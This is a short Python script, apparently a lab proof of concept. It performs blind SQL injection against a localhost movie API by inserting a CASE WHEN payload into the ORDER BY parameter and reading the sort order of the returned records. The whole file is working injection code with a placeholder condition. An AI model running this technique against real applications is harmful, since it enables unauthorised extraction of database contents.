import requests
import urllib.parse
import json

port= "5000"
url = f"http://localhost:{port}/getMovie/orderBy/"

query = "1=1"
payload = f"(CASE WHEN {query} THEN name ELSE id END)--"

urllib.parse.quote(payload)
print(payload)
print("\n--------------\n")

r = requests.get(url + payload)

r = json.loads(r.text)
r = "\n".join([str([x['id'], x['name']]) for x in r[0:10]])

print(r)